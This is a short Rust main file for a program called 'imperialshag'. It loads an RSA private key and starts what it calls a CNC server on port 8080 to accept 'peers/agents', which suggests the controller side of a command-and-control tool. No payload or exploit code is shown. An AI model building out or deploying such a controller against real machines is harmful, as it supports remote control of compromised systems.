use std::sync::Arc;
use tokio::signal;
use tokio::sync::Mutex;

mod crypto;
mod server;
mod socket;

const IP: &'static str = "0.0.0.0";
const PORT: u16 = 8080;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("Welcome to imperialshag :)");
    println!("Starting TCP server.");

    // Load the private key used to establish a clean handshake process.
    let rsa_private_key = crypto::load_private_rsa("private.pem").await.unwrap();

    // Construct a new server struct wrapped in thread safe components (Arc/Mutex)
    let server = Arc::new(Mutex::new(server::Server::new(rsa_private_key)));

    // Bind the server and accept new peers/agents
    server::start_cnc_server(IP, PORT, &server).await?;
    signal::ctrl_c().await?;
    Ok(())
}